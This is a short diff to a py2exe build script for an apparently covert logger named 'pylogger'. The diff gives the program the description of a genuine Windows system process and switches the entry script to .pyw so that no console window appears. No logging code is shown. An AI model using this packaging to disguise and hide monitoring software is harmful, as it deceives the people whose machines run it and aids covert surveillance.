@@ -9,6 +9,6 @@ setup(
     description = 'Host Process for Windows Tasks-',
 
     options = {'py2exe': {'bundle_files': 1, 'compressed': True}},
-    windows = [{'script': "pylogger.py"}],
+    windows = [{'script': "pylogger.pyw"}],
     zipfile = None,
 )
